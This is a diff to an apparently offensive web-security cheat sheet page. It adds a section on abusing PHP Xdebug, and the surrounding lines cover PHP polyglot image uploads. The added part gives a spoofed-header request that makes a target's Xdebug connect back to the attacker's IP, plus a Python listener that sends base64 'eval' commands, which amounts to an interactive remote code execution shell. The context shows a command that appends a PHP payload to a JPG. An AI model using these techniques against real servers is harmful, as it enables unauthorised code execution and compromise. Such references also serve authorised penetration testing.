@@ -167,6 +167,8 @@
     
         <li><a class="" href="#php-polyglot-file">PHP Polyglot file</a></li>
     
+        <li><a class="" href="#xdebug">XDebug</a></li>
+    
     </ul>
     
 
@@ -454,6 +456,31 @@ Extension</a> of a 1 pixel GIF:</p>
 <p>On most formats (mp3, jpg, ...) there is an <code>EOF</code> after what we can add the
 payload. So the easiest way is to append to a valid file our payload:</p>
 <pre><code class="language-bash">cat valid.jpg payload.php &gt; polyglot.php.jpg
+</code></pre>
+
+<h2 id="xdebug">XDebug</h2>
+<p>Make a request with the following parameters and header:</p>
+<pre><code class="language-http">GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
+...
+X-Forwarded-For: {YOUR_IP}
+HTTP_CLIENT_IP: {YOUR_IP}
+</code></pre>
+
+<p>Then on your server execute the following python script:</p>
+<pre><code class="language-python">#!/usr/bin/python2
+import socket
+
+ip_port = ('0.0.0.0', 9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+  client_data = conn.recv(1024)
+  print(client_data)
+  data = raw_input('&gt;&gt; ')
+  conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
 </code></pre>
             
           </div>
